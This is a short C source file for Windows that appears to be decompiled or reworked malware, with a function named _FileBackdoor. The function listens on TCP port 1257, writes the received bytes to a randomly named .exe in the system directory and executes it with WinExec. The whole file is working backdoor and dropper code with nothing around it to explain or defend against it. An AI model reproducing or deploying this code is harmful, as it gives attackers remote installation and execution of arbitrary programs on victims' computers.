#include "data_globals.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#pragma optimize("", off)
DWORD WINAPI _FileBackdoor(void)
{
    // Scalar variables converted to volatile buffer + pointer
    volatile DWORD DVar1_buf[2] = {{0, (DWORD)0}};
    volatile DWORD *p_DVar1 = (volatile DWORD *)&DVar1_buf[0];

    volatile uint32_t random_value_buf[2] = {{0, (uint32_t)0}};
    volatile uint32_t *p_random_value = (volatile uint32_t *)&random_value_buf[0];

    volatile int bytes_received_buf[2] = {{0, (int)0}};
    volatile int *p_bytes_received = (volatile int *)&bytes_received_buf[0];

    volatile SOCKET local_10_buf[2] = {{INVALID_SOCKET, (SOCKET)0}};
    volatile SOCKET *p_local_10 = (volatile SOCKET *)&local_10_buf[0];

    volatile FILE* local_14_buf[2] = {{NULL, (FILE*)0}};
    volatile FILE* *p_local_14 = (volatile FILE* *)&local_14_buf[0];

    // Arrays and structs remain unchanged
    struct sockaddr_in local_398;
    WSADATA local_388;
    char local_1f5[25];
    CHAR local_1dc[256];
    char local_dc[200];

    WSAStartup(MAKEWORD(2,2), &local_388);
    (*p_local_10) = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    local_398.sin_family = AF_INET;
    local_398.sin_port = htons(1257);
    local_398.sin_addr.s_addr = INADDR_ANY;

    bind((*p_local_10), (struct sockaddr *)&local_398, sizeof(struct sockaddr_in));
    listen((*p_local_10), 1);
    (*p_local_10) = accept((*p_local_10), (struct sockaddr *)&local_398, NULL);

    memset(local_dc, 0, sizeof(local_dc));
    memset(local_1dc, 0, sizeof(local_1dc));
    memset(local_1f5, 0, sizeof(local_1f5));

    (*p_DVar1) = GetTickCount();
    srand((*p_DVar1));
    GetSystemDirectoryA(local_1dc, sizeof(local_1dc));
    (*p_random_value) = rand();
    sprintf(local_1f5, "\\%d.exe", (*p_random_value));
    strcat(local_1dc, local_1f5);
    (*p_local_14) = fopen(local_1dc, "wb");

    while (1) {
        (*p_bytes_received) = recv((*p_local_10), local_dc, sizeof(local_dc), 0);
        if ((*p_bytes_received) == 0) break;
        fputs(local_dc, (*p_local_14));
        memset(local_dc, 0, sizeof(local_dc));
    }

    fclose((*p_local_14));
    closesocket((*p_local_10));
    WinExec(local_1dc, 0);

    return 0;
}
#pragma optimize("", on)
